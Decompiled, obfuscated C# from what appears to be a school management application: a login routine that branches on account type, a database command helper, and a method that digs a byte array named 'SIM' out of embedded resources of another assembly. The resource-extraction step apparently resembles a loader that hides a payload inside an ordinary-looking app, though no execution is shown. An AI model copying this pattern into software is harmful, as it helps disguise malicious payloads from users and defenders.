using System;
using System.Collections;
using System.Globalization;
using System.Linq;
using System.Reflection;
using System.Resources;
using System.Windows.Forms;
using Hr60;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Yw6;
using d1C;
using t8C;

namespace Xi1;

[StandardModule]
internal sealed class j5J
{
	public static void Cn2(string y3G)
	{
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Xe9.con.k4F();
			Eo3 cmd = Xe9.cmd;
			cmd.Connection = Xe9.con;
			cmd.CommandText = y3G;
			cmd = null;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)48, (object)null);
			ProjectData.ClearProjectError();
		}
		finally
		{
			Xe9.con.Xb4();
			Xe9.da.Ns5();
		}
		Xe9.con.Xb4();
	}

	public static void Db8(string c2F)
	{
		//IL_00e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Xe9.con.k4F();
			Xe9.dReader = Xe9.cmd.ExecuteReader;
			if (Operators.CompareString(c2F, "login", false) == 0)
			{
				while (Xe9.dReader.Kb8())
				{
					if (Operators.CompareString(Xe9.ACCOUNT_TYPE, "Administrator", false) == 0)
					{
						((ButtonBase)Ng2.Forms.Home.btnLogout).set_Text(Xe9.ACCOUNT_NAME);
						((Control)Ng2.Forms.Home).Show();
						((Control)Ng2.Forms.LoginForm).Hide();
					}
					else if (Operators.CompareString(Xe9.ACCOUNT_TYPE, "Teacher", false) != 0 && Operators.CompareString(Xe9.ACCOUNT_TYPE, "Accounts", false) != 0 && Operators.CompareString(Xe9.ACCOUNT_TYPE, "Student", false) != 0)
					{
						Interaction.MsgBox((object)"Please contact the IT Department for Account Activation", (MsgBoxStyle)48, (object)null);
					}
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)48, (object)null);
			ProjectData.ClearProjectError();
		}
		finally
		{
			Xe9.con.Xb4();
			Xe9.da.Ns5();
		}
		Xe9.con.Xb4();
	}

	internal static byte[] Mi1(string[] k0D, int Kf2)
	{
		checked
		{
			byte[] result = default(byte[]);
			try
			{
				string[] array = new string[k0D.Length - 1 + 1];
				int num = k0D.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					try
					{
						array[i] = k0D[i].Replace(".resources", "");
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						ProjectData.ClearProjectError();
					}
				}
				string[] array2 = array;
				foreach (string text in array2)
				{
					if (text == null)
					{
						continue;
					}
					try
					{
						ResourceManager resourceManager = new ResourceManager(text, (Assembly)t0S8.mDic["bee"]);
						ResourceSet resourceSet = resourceManager.GetResourceSet(CultureInfo.CurrentCulture, createIfNotExists: true, tryParents: true);
						foreach (object item in resourceSet.OfType<object>())
						{
							DictionaryEntry dictionaryEntry = ((item != null) ? ((DictionaryEntry)item) : default(DictionaryEntry));
							if (Operators.CompareString(dictionaryEntry.Key.ToString(), "SIM", false) == 0)
							{
								result = (byte[])dictionaryEntry.Value;
								return result;
							}
						}
					}
					catch (Exception ex3)
					{
						ProjectData.SetProjectError(ex3);
						Exception ex4 = ex3;
						ProjectData.ClearProjectError();
					}
				}
				return result;
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5);
				Exception ex6 = ex5;
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}
}
